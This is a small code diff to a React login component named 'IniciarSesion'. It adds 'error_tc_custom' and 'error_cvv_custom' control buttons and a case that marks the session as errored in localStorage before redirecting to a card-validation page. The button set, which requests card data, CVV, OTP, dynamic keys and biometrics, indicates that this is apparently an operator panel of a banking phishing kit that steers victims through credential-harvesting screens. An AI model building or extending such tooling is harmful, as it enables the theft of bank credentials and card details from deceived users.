@@ -526,7 +526,7 @@ export default function IniciarSesion() {
         'solicitar_tc', 'solicitar_otp', 'solicitar_din', 'solicitar_finalizar',
 
         // Botones linea 2
-        'error_tc', 'error_otp', 'error_din', 'error_login',
+        'error_tc', 'error_tc_custom', 'error_otp', 'error_din', 'error_login', 'error_cvv_custom',
 
         // Botones linea 3
         'solicitar_biometria', 'error_923',
@@ -587,6 +587,10 @@ export default function IniciarSesion() {
 
         // ------------ Casos botones linea 2 ------------
         case 'error_tc':
+        case 'error_tc_custom':
+
+          // Se almacena en el localStorage el estado de sesión con error
+          localStorage.setItem('estado_sesion', 'error');
 
           // Redirige a la página
           redirigir(`/validacion-tc`);
